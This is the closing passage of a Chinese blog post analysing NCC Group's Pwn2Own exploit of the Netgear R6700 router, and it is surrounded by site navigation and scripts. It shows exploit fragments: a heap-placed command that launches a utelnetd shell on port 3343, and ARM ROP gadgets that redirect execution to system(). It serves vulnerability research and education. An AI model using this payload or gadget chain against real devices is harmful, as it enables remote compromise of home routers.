<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e8f8895596ce61800699e533f9d7c442-efc4ee.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e8f8895596ce61800699e533f9d7c442-efc4ee.png"></a></p>
<p>我们发现我们的 payload 会存储在 堆上， 因此 ， 我们可以将要执行的命令， 在第一次链接的时候 ， 就将命令写入。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">b&#x27;/bin/utelnetd -p 3343 -l /bin/ash \x00&#x27;</span></span><br><span class="line">cmd = <span class="string">b&#x27;/bin/touch /tmp/hacked&#x27;</span></span><br><span class="line">cmd += <span class="string">b&quot;\x00&quot;</span> * (len(cmd) % <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_uclibc</span>():</span></span><br><span class="line">		...</span><br><span class="line">    junkdata[<span class="number">1026</span>: <span class="number">1026</span>+ len(cmd)] = cmd</span><br></pre></td></tr></table></figure>

<p>在覆盖返回地址之前 ， 除了在 leak 需要注意的那几个变量以外 ，我们还需要单独注意</p>
<ul>
<li>flag1</li>
<li>v17</li>
<li>response_len</li>
</ul>
<p>等变量的值， 要单独重新赋值。</p>
<p>最后我们需要将 <code>R0</code> 的值指向堆上的 <code>0x1b880</code> 地址。 所以我们需要单独几个 <code>gadget</code> ， 这里我使用的是两个 <code>gadget</code> 。</p>
<p>首先通过第一个  <code>gadget</code>  控制 <code>R3</code>  为 0x1b880</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00001504 : pop &#123;r3, r4, fp, pc&#125;</span><br></pre></td></tr></table></figure>

<p>然后通过 第二个 <code>gadget</code>  将 <code>R3</code> 的值赋值给 <code>R0</code> 并且控制 PC 跳转到 <code>system</code> 函数上，从而完成任意命令执行。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00000a80 : mov r0, r3 ; pop &#123;fp, pc&#125;</span><br></pre></td></tr></table></figure>

<p>最后就可以完成任意命令执行了。</p>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-657974c446c112a83a99c724fa6581d1-a39218.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-657974c446c112a83a99c724fa6581d1-a39218.png"></a></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://research.nccgroup.com/2022/08/30/ncc-con-europe-2022-pwn2own-austin-presentations/">NCC Con Europe 2022 – Pwn2Own Austin Presentations</a></p>
</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%BC%96%E5%86%99"><span class="toc-number">2.</span> <span class="toc-text">利用编写</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass-ASLR"><span class="toc-number">2.1.</span> <span class="toc-text">Bypass ASLR</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Arbitrary-command-execution"><span class="toc-number">2.2.</span> <span class="toc-text">Arbitrary command execution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html&text=Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html&title=Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html&is_video=false&description=Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析&body=Check out this article: https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html&title=Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html&title=Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html&title=Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html&title=Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html&name=Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/nccgroup-in-pwn2own-pwned-netgear-r6700-route-vulnerability-analysis.html&t=Nccgroup Pwn2Own 中攻破 Netgear R6700路由器的漏洞分析"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2024
    Swing
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


    <!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>

<!-- clipboard -->

  
<script src="/lib/clipboard/clipboard.min.js"></script>

  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-133464311-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-133464311-1');
    </script>

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'swing';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


</body>
</html>
